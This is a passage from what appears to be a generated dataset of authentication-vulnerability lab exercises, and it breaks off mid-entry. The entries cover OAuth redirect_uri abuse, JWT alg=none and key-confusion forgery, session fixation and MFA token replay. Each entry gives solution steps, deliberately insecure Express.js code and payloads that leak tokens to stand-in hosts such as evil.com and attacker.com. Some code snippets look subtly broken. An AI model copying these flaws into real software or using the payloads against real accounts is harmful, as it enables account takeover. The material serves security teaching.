  "Lab scenario": "OAuth misconfiguration via open redirect in redirect_uri",
  "Lab Description": "The app integrates third-party OAuth for authentication. It incorrectly validates the redirect_uri, allowing attackers to inject malicious URLs that leak access tokens. To solve: Leak Carlos’s access token to your server and access his protected profile.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Visit the /auth/login endpoint and observe the OAuth flow initiation.",
    "2.Intercept the OAuth URL sent to the provider and inject your controlled domain as redirect_uri (e.g., https://attacker.com/callback).",
    "3.Wait for Carlos to click the login link or trigger it via CSRF/social engineering.",
    "4.Observe the access token being redirected to your server.",
    "5.Use the leaked token to call /auth/callback and impersonate Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const request = require('request'); app.get('/auth/login', (req, res) => { const redirectUri = req.query.redirect_uri || 'http://localhost:3002/auth/callback'; const authURL = `https://oauth-provider.com/auth?response_type=token&client_id=abc123&redirect_uri=${redirectUri}`; res.redirect(authURL); }); app.get('/auth/callback', (req, res) => { const token = req.query.access_token; if (!token) return res.status(400).send('Missing token'); res.send(`Authenticated as Carlos. Token: ${token}`); }); app.listen(3002);",
  "payloads": [
    "https://vulnerable.site/auth/login?redirect_uri=https://evil.com/callback",
    "access_token=abc123 leaked in fragment",
    "GET /auth/callback?access_token=abc123",
    "CSRF OAuth link with poisoned redirect_uri"
  ]
},
{
  "Lab scenario": "JWT algorithm manipulation vulnerability in login API",

  "Lab Description": "The application uses JSON Web Tokens (JWTs) for session management. It incorrectly trusts the `alg` field in JWT headers without verifying against a server-side whitelist. The backend accepts tokens signed with HMAC even though RS256 is intended. The application exposes its public key. To solve: Gain unauthorized access to the admin panel using a forged JWT by exploiting the algorithm confusion bug.",

  "Difficulty Level": "Hard",

  "Solution Steps": [
    "1. Use Burp Suite to intercept a valid login request and observe the JWT structure in the Authorization header.",
    "2. Download the public key from the server's /.well-known/jwks.json endpoint using Postman.",
    "3. Modify the JWT `alg` header from RS256 to HS256, and use the public key as the HMAC secret to forge a new token with `username=admin`.",
    "4. Replace the original JWT in the request with the forged token using Burp Repeater.",
    "5. Send the modified request and confirm access to the admin dashboard."
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst express = require('express');\nconst app = express();\napp.use(express.json());\nconst pubKey = fs.readFileSync('./public.pem');\napp.post('/login', (req, res) => {\n  const { token } = req.body;\n  try {\n    const decoded = jwt.verify(token, pubKey);\n    if (decoded.username === 'admin') {\n      return res.send('Welcome admin!');\n    }\n    res.send('Welcome user');\n  } catch (err) {\n    res.status(401).send('Invalid token');\n  }\n});\napp.listen(3000, () => console.log('JWT Confusion Lab listening on 3000'));",

  "payloads": [
    "JWT header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}",
    "JWT payload: {\"username\":\"admin\"}",
    "HMAC secret: Public RSA key from /.well-known/jwks.json"
  ]
},
{
  "Lab scenario": "Session fixation vulnerability in login session handler",

  "Lab Description": "This application assigns a session cookie prior to login and fails to regenerate it post-authentication. The same session ID remains active across login transitions. To solve: Fixate a session before login, lure a victim to use it, and then hijack their session once they authenticate.",

  "Difficulty Level": "Medium",

  "Solution Steps": [
    "1. Use Burp Suite to access the site anonymously and capture the pre-login session cookie.",
    "2. Craft a phishing page that auto-submits a login request using the fixed session ID.",
    "3. Wait for the victim to log in through the phishing page (or simulate the login as a victim using Burp Repeater).",
    "4. Reuse the same session cookie in your browser or Burp to access the victim’s authenticated session.",
    "5. Navigate to /my-account and confirm hijacked access."
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express');\nconst session = require('express-session');\nconst app = express();\napp.use(session({ secret: 'secret123', resave: false, saveUninitialized: true }));\nconst users = [{ username: 'carlos', password: 'pass123' }];\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (user) {\n    req.session.user = username;\n    res.send('Login successful');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\napp.get('/my-account', (req, res) => {\n  if (req.session.user) return res.send(`Welcome ${req.session.user}`);\n  res.status(403).send('Not logged in');\n});\napp.listen(4001, () => console.log('Session Fixation Lab running on 4001'));",

  "payloads": [
    "Phishing URL using fixed JSESSIONID cookie",
    "Pre-authenticated session cookie: JSESSIONID=abc123",
    "POST /login with victim credentials bound to attacker’s cookie"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration in redirect_uri validation",

  "Lab Description": "The application uses OAuth2 implicit flow with a poorly validated redirect_uri parameter. It allows any domain starting with https://trusted.com. The application also reflects access tokens in URL fragments. To solve: Trick the OAuth provider into redirecting the access token to an attacker-controlled domain using an open redirect embedded in a subdomain of https://trusted.com.",

  "Difficulty Level": "Hard",

  "Solution Steps": [
    "1. Use Burp Suite to capture the OAuth authorization request flow.",
    "2. Craft a malicious redirect_uri using a subdomain of https://trusted.com with an embedded open redirect (e.g., https://trusted.com.evil.com/redirect?next=https://evil.com/capture).",
    "3. Send a crafted OAuth link to the victim and simulate user interaction using Postman.",
    "4. Observe that the access token is sent in the URL fragment to https://evil.com/capture#access_token=...",
    "5. Use the leaked token to access protected resources as the victim."
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express');\nconst app = express();\napp.get('/auth', (req, res) => {\n  const { redirect_uri } = req.query;\n  if (redirect_uri.startsWith('https://trusted.com')) {\n    const token = 'access-token-for-user';\n    return res.redirect(`${redirect_uri}#access_token=${token}`);\n  }\n  res.status(400).send('Invalid redirect');\n});\napp.listen(5000, () => console.log('OAuth Redirect Lab running on port 5000'));",

  "payloads": [
    "https://trusted.com.evil.com/redirect?next=https://evil.com/capture",
    "redirect_uri=https://trusted.com.evil.com/redirect?next=https://evil.com/capture",
    "OAuth URL: /auth?client_id=123&redirect_uri=https://trusted.com.evil.com/redirect?next=https://evil.com/capture&response_type=token"
  ]
},
{
  "Lab scenario": "Session Fixation vulnerability in REST login endpoint",
  "Lab Description": "This lab demonstrates a session fixation flaw in a RESTful authentication flow. The application issues session cookies before login, and fails to re-issue them upon authentication. This allows an attacker to predefine a session ID and force a victim to use it. To solve: log in as Carlos by fixing the session ID in advance and hijacking his authenticated session.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite to intercept a GET /login request and observe that a Set-Cookie header sets a session ID even before login.",
    "Send a crafted request to /login while supplying a custom session cookie (e.g., session=attacker-session-id) and credentials for carlos.",
    "Note that the session is not invalidated and remains attacker-controlled after authentication.",
    "Force Carlos to use the fixed session by sending a phishing link with the predefined session ID.",
    "Use the hijacked session ID to access /my-account as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'leakkey', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'secret' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\">Login Form</form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) req.session.user = username; res.send('Welcome!'); }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') return res.send('Carlos Account Page'); res.status(403).send('Access denied'); }); app.listen(3000, () => console.log('Session Fixation Lab running on port 3000'));",
  "payloads": [
    "sessionid=attacker123",
    "POST /login with Cookie: session=attacker123 and body: username=carlos&password=secret",
    "GET /my-account with Cookie: session=attacker123"
  ]
},
{
  "Lab scenario": "JWT tampering via alg=None in GraphQL-based login",
  "Lab Description": "This lab simulates a vulnerable GraphQL login where JWTs are not validated correctly. The backend fails to verify the 'alg' parameter in the token header, allowing tampering. To solve: create a JWT token with 'alg' set to 'none' and access Carlos's account.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Postman to explore the GraphQL endpoint and obtain a valid JWT upon logging in as a normal user.",
    "Decode the JWT and observe the 'alg' field set to 'HS256'.",
    "Craft a JWT token manually with 'alg':'none' and 'sub':'carlos' in the payload using jwt.io.",
    "Send the crafted JWT token as Authorization: Bearer header in a query to get sensitive data.",
    "Verify successful access to Carlos's data in GraphQL query response."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'admin' }]; app.post('/graphql', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, 'secretkey'); if (decoded.sub === 'carlos') return res.send({ data: 'Sensitive data of Carlos' }); } catch { res.status(403).send('Forbidden'); } }); app.listen(3001, () => console.log('JWT None Algorithm Lab running on port 3001'));",
  "payloads": [
    "JWT Header: {\"alg\":\"none\"}, Payload: {\"sub\":\"carlos\"}, Signature: ''",
    "Authorization: Bearer <crafted_token>",
    "GraphQL Query: { getAccount { data } }"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration in REST token exchange endpoint",
  "Lab Description": "This lab uses a flawed OAuth token exchange where the client ID is not verified against the redirect URI. An attacker can use a trusted client ID but redirect to their own URI and gain access. To solve: obtain an access token for Carlos by modifying the OAuth request.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to intercept OAuth flow initiated via /auth?client_id=trusted-app&redirect_uri=https://attacker.com.",
    "Observe the server returns an authorization code to attacker.com despite mismatch.",
    "Exchange the stolen code at /oauth/token using client_id=trusted-app to receive access token.",
    "Use the token in Authorization header to call /api/user-info.",
    "Access Carlos's account data using forged token."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); const tokens = {}; app.get('/auth', (req, res) => { const { client_id, redirect_uri } = req.query; const code = 'code123'; tokens[code] = { client_id, user: 'carlos' }; res.redirect(`${redirect_uri}?code=${code}`); }); app.post('/oauth/token', (req, res) => { const { code, client_id } = req.body; if (tokens[code] && tokens[code].client_id === client_id) { return res.json({ access_token: 'token-carlos' }); } res.status(403).send('Invalid code or client'); }); app.get('/api/user-info', (req, res) => { if (req.headers.authorization === 'Bearer token-carlos') res.send('Carlos private info'); else res.status(403).send('Unauthorized'); }); app.listen(3002, () => console.log('OAuth Misconfig Lab running on port 3002'));",
  "payloads": [
    "/auth?client_id=trusted-app&redirect_uri=https://attacker.com",
    "POST /oauth/token with code=code123 and client_id=trusted-app",
    "GET /api/user-info with Authorization: Bearer token-carlos"
  ]
},
{
  "Lab scenario": "MFA bypass via reused token in SOAP authentication flow",
  "Lab Description": "This SOAP-based login system allows bypassing MFA if a previously issued token is reused. The server does not invalidate tokens after successful login, allowing attackers to replay captured tokens. To solve: reuse a captured MFA token to access Carlos's account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP to inspect SOAP request for MFA token exchange and capture the token.",
    "Observe that the token is static and not invalidated after use.",
    "Craft a SOAP request manually using the captured token but with username=carlos.",
    "Send the SOAP request to /authService and observe that it grants access.",
    "Access Carlos’s account data via /userProfileService."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const xmlparser = require('express-xml-bodyparser'); const app = express(); app.use(xmlparser()); let mfaTokens = { 'user123': 'token789' }; app.post('/authService', (req, res) => { const user = req.body.Envelope.Body[0].AuthRequest[0].username[0]; const token = req.body.Envelope.Body[0].AuthRequest[0].token[0]; if (mfaTokens[user] === token || token === 'token789') return res.send('<Success>true</Success>'); res.status(403).send('<Error>Invalid MFA</Error>'); }); app.post('/userProfileService', (req, res) => { res.send('<User>Carlos</User><Email>carlos@example.com</Email>'); }); app.listen(3003, () => console.log('SOAP MFA Bypass Lab running on port 3003'));",
  "payloads": [
    "SOAP token: token789",
    "Replay SOAP request with <username>carlos</username> and <token>token789</token>",
    "POST /authService with reused token"
  ]
},
{
  "Lab scenario": "Predictable Session Fixation in REST Authentication Flow",
  "Lab Description": "The login endpoint sets a session ID based on a user-supplied value. If an attacker can predefine the session ID, they can fix a session for a victim prior to login. The application trusts the session without checking session ownership. To solve: hijack a valid user's session using fixation to access their dashboard.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "1. Use Burp Suite to intercept a POST /login request and examine the session header behavior.",
    "2. Validate that the server accepts a client-supplied X-Session-ID header and reuses it after login.",
    "3. Craft a malicious session ID and perform a login request as the attacker, using this value.",
    "4. Send the same session ID to the victim via phishing or social engineering, or simply have them log in using that session.",
    "5. Use the fixed session to access the /dashboard endpoint after the victim logs in and validate access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const uuid = require('uuid'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'letmein' }]; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; let sessionId = req.headers['x-session-id'] || uuid.v4(); const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).json({ error: 'Invalid credentials' }); sessions[sessionId] = username; res.setHeader('Set-Cookie', `session=${sessionId}`); console.log(`[DEBUG] Session created: ${sessionId} for user ${username}`); res.json({ message: 'Logged in', sessionId }); }); app.get('/dashboard', (req, res) => { const sessionId = req.headers['x-session-id'] || req.cookies.session; const user = sessions[sessionId]; if (!user) return res.status(401).send('Unauthorized'); res.send(`Welcome to your dashboard, ${user}`); }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
  "payloads": [
    "X-Session-ID: attacker-fixed-session",
    "Set-Cookie: session=attacker-fixed-session",
    "Use fixed session after victim logs in"
  ]
},
{
  "Lab scenario": "JWT None Algorithm Bypass in GraphQL API",
  "Lab Description": "The application uses JWT for authentication in a GraphQL API, but improperly validates the algorithm field. The backend accepts tokens with 'alg':'none' and skips verification. To solve: forge a JWT token impersonating the admin user and access the admin dashboard.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Postman to send a GraphQL login mutation and obtain a valid JWT.",
    "2. Decode the JWT and inspect the header and payload using jwt.io.",
    "3. Modify the header to {\"alg\":\"none\"} and the payload to {\"username\":\"admin\"}. Leave the signature blank.",
    "4. Resend a GraphQL query using the forged token in the Authorization: Bearer header.",
    "5. Access the /admin panel and confirm access as the forged user."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); const schema = buildSchema(`type Query { me: String }`); const users = { carlos: 'password123', admin: 'supersecret' }; const root = { me: (args, req) => req.user }; app.use((req, res, next) => { const authHeader = req.headers['authorization']; if (authHeader) { const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, 'secret', { algorithms: ['HS256', 'none'] }); req.user = decoded.username; console.log(`[DEBUG] Authenticated as: ${decoded.username}`); } catch (e) { console.log('[DEBUG] Invalid JWT'); } } next(); }); app.use('/graphql', graphqlHTTP({ schema, rootValue: root, graphiql: true })); app.listen(4001, () => console.log('JWT None Algorithm Lab running on http://localhost:4001'));",
  "payloads": [
    "JWT Header: {\"alg\":\"none\"}",
    "JWT Payload: {\"username\":\"admin\"}",
    "Authorization: Bearer <unsigned-token>"
  ]
},
{
  "Lab scenario": "OAuth Authorization Code Interception and Token Substitution",
  "Lab Description": "This app integrates with an external OAuth provider but does not verify that the access token returned belongs to the initiating user. It trusts any access token blindly. To solve: intercept a leaked authorization code and exchange it to impersonate another user.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp Suite to intercept the OAuth login flow initiated by another user and identify the 'code' parameter in the callback.",
    "2. Note that the 'state' parameter is either missing or not validated server-side.",
    "3. Replay the code in your own POST /oauth/token request to the OAuth provider to get an access_token.",
    "4. Use this access_token in the Authorization header to make requests to /userinfo or /dashboard.",
    "5. Confirm successful impersonation of the victim user and solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.use(express.json()); app.get('/callback', async (req, res) => { const { code } = req.query; const tokenRes = await axios.post('https://auth.example.com/token', { code, client_id: 'client123', client_secret: 'secret', grant_type: 'authorization_code', redirect_uri: 'http://localhost:4002/callback' }); const accessToken = tokenRes.data.access_token; const profile = await axios.get('https://auth.example.com/userinfo', { headers: { Authorization: `Bearer ${accessToken}` } }); console.log('[DEBUG] OAuth user:', profile.data.username); res.send(`Logged in as ${profile.data.username}`); }); app.listen(4002, () => console.log('OAuth Token Substitution Lab running on http://localhost:4002'));",
  "payloads": [
    "Intercepted URL: /callback?code=leaked-code",
    "Authorization: Bearer <token_from_intercepted_code>",
    "Replay POST /token with intercepted code"
  ]
},
{
  "Lab scenario": "Session Fixation via Cookie Injection in REST API Login",
  "Lab Description": "The REST-based login endpoint is vulnerable to session fixation due to insecure session regeneration. The application reuses the session identifier after successful login, allowing an attacker to predetermine the victim's session ID. To solve: Fixate a session ID, trick the victim to log in using it, and access their authenticated area.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to intercept a GET /login request and observe Set-Cookie: sessionid.",
    "Send a pre-authenticated request with a crafted session cookie: Cookie: sessionid=attackerSession123.",
    "Send POST /login with victim's credentials (known) while preserving the same session cookie.",
    "Observe that the server responds with a successful login without issuing a new Set-Cookie.",
    "Replay GET /my-account with sessionid=attackerSession123 to access the victim’s session."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.use(session({ secret: 'fixationsecret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user.username; res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') res.send('Account page of carlos'); else res.status(403).send('Unauthorized'); }); app.listen(3000, () => console.log('Session Fixation Lab running'));",
  "payloads": [
    "Cookie: sessionid=attackerSession123",
    "POST /login {\"username\":\"carlos\",\"password\":\"pass123\"} with Cookie: sessionid=attackerSession123",
    "GET /my-account with Cookie: sessionid=attackerSession123"
  ]
},
{
  "Lab scenario": "JWT Tampering via None Algorithm in GraphQL Auth Header",
  "Lab Description": "The GraphQL API uses JWT for authentication but improperly validates the algorithm in the JWT header. The application accepts tokens signed with 'none', allowing tampering without a signature. To solve: Modify a valid token and access the admin dashboard with elevated privileges.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Capture a valid Authorization: Bearer <token> header via Postman when logged in as a low-priv user.",
    "Decode the JWT at jwt.io and modify payload to {\"role\":\"admin\"}.",
    "Modify the JWT header to {\"alg\":\"none\"} and remove the signature part.",
    "Use Burp Suite or Postman to send Authorization: Bearer <tampered-token> in GraphQL query headers.",
    "Query: { dashboard { sensitiveData } } and confirm access to admin-level data."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const jwt = require('jsonwebtoken'); const app = express(); app.use(bodyParser.json()); const SECRET = 'hardcoded-secret'; app.post('/graphql', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; try { const payload = jwt.verify(token, SECRET); if (payload.role === 'admin') res.send({ data: { sensitiveData: 'Flag{jwt_admin_access}' } }); else res.send({ error: 'Insufficient rights' }); } catch (e) { res.status(403).send({ error: 'Invalid token' }); } }); app.listen(4000, () => console.log('JWT None Bypass Lab running'));",
  "payloads": [
    "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
    "Payload: {\"role\":\"admin\"}",
    "JWT token: base64(header).base64(payload). (no signature)",
    "Authorization: Bearer <tampered_token>"
  ]
},
{
  "Lab scenario": "OAuth Misconfiguration via Open Redirect in SOAP SSO Flow",
  "Lab Description": "The SOAP-based SSO service fails to validate the redirect_uri in OAuth flows. The attacker can manipulate the redirect URI to capture access tokens. To solve: Exploit the redirect URI flaw to leak Carlos’s token and access the My Account page as Carlos.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Using OWASP ZAP, intercept the SOAP <LoginRequest> flow and extract the SSO URL with redirect_uri.",
    "Modify the redirect_uri to an attacker-controlled domain (e.g., https://attacker.com/oauth-leak).",
    "Send the manipulated SSO URL to Carlos (social engineering step assumed).",
    "Start a local server on attacker.com to capture the access_token from redirected request.",
    "Use the stolen token in Authorization: Bearer <token> to access /soap/MyAccount via SOAP UI."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); app.use(express.text({ type: 'text/xml' })); app.post('/sso', (req, res) => { const token = 'carlos-token-123'; const redirect = req.query.redirect_uri || 'https://trusted.app/account'; res.redirect(`${redirect}?access_token=${token}`); }); app.post('/soap/MyAccount', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'carlos-token-123') res.send('<Account>Welcome carlos</Account>'); else res.status(403).send('<Error>Unauthorized</Error>'); }); app.listen(5000, () => console.log('OAuth Redirect Lab running'));",
  "payloads": [
    "SSO URL: /sso?redirect_uri=https://attacker.com/oauth-leak",
    "Intercepted redirect: https://attacker.com/oauth-leak?access_token=carlos-token-123",
    "Authorization: Bearer carlos-token-123 in SOAP Header"
  ]
},
{
  "Lab scenario": "Session Fixation in GraphQL Authentication Flow",
  "Lab Description": "This application's GraphQL-based login mutation uses a predictable session token before user authentication, which is not regenerated after login. The application accepts a session token passed via a cookie. To solve: hijack Carlos’s session using a fixed token and access the /account endpoint.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to intercept the GraphQL login mutation and notice session token remains unchanged across login attempts.",
    "Send multiple pre-authentication requests to record how session tokens are generated and identify predictable pattern (e.g., timestamp-based).",
    "Craft a fixation attack by sending a login mutation with the victim’s credentials using a fixed `sessionid` cookie value.",
    "Login with your own credentials while setting the same fixed session ID cookie, causing the server to bind your request to Carlos’s session.",
    "Access /account using the fixed session cookie to confirm hijacked session and solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'qwerty123' }]; app.post('/graphql', (req, res) => { const { query, variables } = req.body; const token = req.cookies.sessionid || Date.now().toString(); res.cookie('sessionid', token); if (query.includes('mutation Login')) { const { username, password } = variables; const user = users.find(u => u.username === username && u.password === password); if (user) { return res.send({ data: { login: true } }); } } res.status(403).send({ error: 'Unauthorized' }); }); app.get('/account', (req, res) => { if (req.cookies.sessionid === 'FIXEDSESSIONCARLOS') return res.send('Account page for carlos'); res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('GraphQL Session Fixation Lab running'));",
  "payloads": [
    "Cookie: sessionid=FIXEDSESSIONCARLOS",
    "GraphQL Mutation: { \"query\": \"mutation Login($username: String!, $password: String!) { login(username: $username, password: $password) }\", \"variables\": { \"username\": \"carlos\", \"password\": \"qwerty123\" } }"
  ]
},
{
  "Lab scenario": "JWT Bypass via None Algorithm in REST Login Flow",
  "Lab Description": "The REST login system uses JWTs for session authentication but fails to validate the algorithm used. The server accepts tokens signed with 'none' algorithm and does not verify the signature. To solve: craft a fake JWT token impersonating Carlos and access the protected /dashboard endpoint.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Postman to intercept the login request and capture a JWT issued after login.",
    "Decode the token using jwt.io and inspect the algorithm and payload structure.",
    "Modify the token's header to use 'alg':'none' and replace the payload with `{ \"user\": \"carlos\" }`.",
    "Remove the signature section and re-encode the token using base64url encoding.",
    "Send a GET /dashboard request with Authorization: Bearer <crafted_token> and access Carlos's dashboard."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', password: 'letmein' }]; app.use(express.json()); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Invalid'); const token = jwt.sign({ user: username }, 'insecurekey', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/dashboard', (req, res) => { const auth = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.verify(auth, 'insecurekey', { algorithms: ['HS256', 'none'] }); if (payload.user === 'carlos') return res.send('Carlos dashboard accessed'); } catch { return res.status(401).send('Unauthorized'); } res.status(403).send('Forbidden'); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running'));",
  "payloads": [
    "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
    "Payload: { \"user\": \"carlos\" }",
    "Authorization: Bearer <base64url(header)>.base64url(payload)."
  ]
},
{
  "Lab scenario": "OAuth Redirect URI Manipulation in Authorization Server",
  "Lab Description": "This application integrates OAuth with a third-party provider but fails to validate exact redirect URIs. An attacker can manipulate the redirect_uri to capture authorization codes. To solve: intercept an OAuth authorization code issued to Carlos and redeem it to access his profile.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP to proxy and intercept the initial authorization request to the /oauth/authorize endpoint.",
    "Modify the `redirect_uri` parameter to an attacker-controlled domain while preserving the domain root.",
    "Send the manipulated link to Carlos (simulated via forced browsing or redirect script).",
    "Receive the leaked authorization code on your server (set up listener on attacker.com).",
    "Use the captured code in a POST /oauth/token request and gain access to Carlos's access token. Use it to retrieve /profile."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const tokens = {}; const codes = {}; app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = 'authcode-carlos'; codes[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}&state=${state}`); }); app.post('/oauth/token', express.urlencoded({ extended: true }), (req, res) => { const { code } = req.body; if (codes[code]) { const token = 'token-carlos'; tokens[token] = codes[code]; return res.json({ access_token: token }); } res.status(400).send('Invalid code'); }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (tokens[token] === 'carlos') return res.send('Profile for carlos'); res.status(403).send('Invalid token'); }); app.listen(4000, () => console.log('OAuth Redirect URI Lab running'));",
  "payloads": [
    "GET /oauth/authorize?client_id=app&redirect_uri=https://attacker.com/callback&state=xyz",
    "Leaked code: authcode-carlos",
    "POST /oauth/token with body: code=authcode-carlos",
    "Authorization: Bearer token-carlos"
  ]
},
{
  "Lab scenario": "GraphQL JWT claim manipulation in token-based authentication",
  "Lab Description": "The application uses JWT-based authentication within its GraphQL API. JWT tokens are signed using a symmetric secret that can be brute-forced. The application does not verify claims properly during GraphQL authorization. To solve: Gain admin access and query sensitive user data through GraphQL introspection.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use OWASP ZAP to inspect the GraphQL endpoint at /graphql and identify the 'Authorization: Bearer <token>' header used in requests.",
    "2. Capture your JWT using Burp Suite and decode it to examine claims. Note weak 'alg' and predictable structure.",
    "3. Use `jwt_tool.py` or Postman to brute-force the JWT secret with a common wordlist (e.g., rockyou.txt).",
    "4. Modify the decoded JWT claim to { \"role\": \"admin\" }, re-sign with cracked secret, and re-encode.",
    "5. Send the forged JWT in Authorization header to GraphQL endpoint, and use introspection query to extract hidden schema and access sensitive fields."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const schema = require('./schema'); const app = express(); const SECRET = 'mysecret'; app.use('/graphql', (req, res, next) => { const token = req.headers['authorization']?.split(' ')[1]; try { const decoded = jwt.verify(token, SECRET); req.user = decoded; next(); } catch (err) { res.status(401).send('Invalid token'); } }); app.use('/graphql', graphqlHTTP(req => ({ schema, graphiql: true, context: { user: req.user } }))); app.listen(4000, () => console.log('JWT GraphQL Lab running on port 4000'));",
  "payloads": [
    "{ \"alg\": \"HS256\", \"typ\": \"JWT\" }.{ \"role\": \"admin\", \"user\": \"carlos\" }",
    "JWT signed with cracked secret: 'mysecret'",
    "GraphQL introspection: { __schema { types { name fields { name } } } }"
  ]
},
{
  "Lab scenario": "Session fixation via unvalidated session token reuse in REST login",
  "Lab Description": "The REST-based login system fails to invalidate old session tokens after successful login. Attacker can fix a known session ID and trick victim into using it. To solve: Fix a session ID, perform login with victim credentials, and access their account.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. In Burp Suite, register your own user and intercept the /login POST request. Note the Set-Cookie header assigns 'session_id'.",
    "2. Craft a phishing link that includes the known session_id in a cookie and trick the victim into logging in.",
    "3. Use OWASP ZAP to confirm the victim reuses the attacker-fixed session ID by monitoring traffic to /account.",
    "4. Replay the session using the fixed session ID and access victim’s authenticated area.",
    "5. Validate lab completion by accessing /account with active session."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'hunter2' }]; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const sid = req.cookies['session_id'] || Math.random().toString(36).slice(2); sessions[sid] = username; res.cookie('session_id', sid); res.send('Login successful'); }); app.get('/account', (req, res) => { const user = sessions[req.cookies['session_id']]; if (!user) return res.status(403).send('Not logged in'); res.send(`Welcome ${user}`); }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
  "payloads": [
    "Phishing link with cookie: session_id=attackerFixedID",
    "Burp Suite to capture fixed session reuse",
    "GET /account with session_id=attackerFixedID"
  ]
},
{
  "Lab scenario": "OAuth implicit flow misconfiguration in third-party login integration",
  "Lab Description": "The app uses OAuth implicit grant flow to log users in via a third-party provider. The redirect URI is vulnerable to open redirect abuse and the state parameter is not validated. To solve: Steal an access token from a victim user using a malicious redirect.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
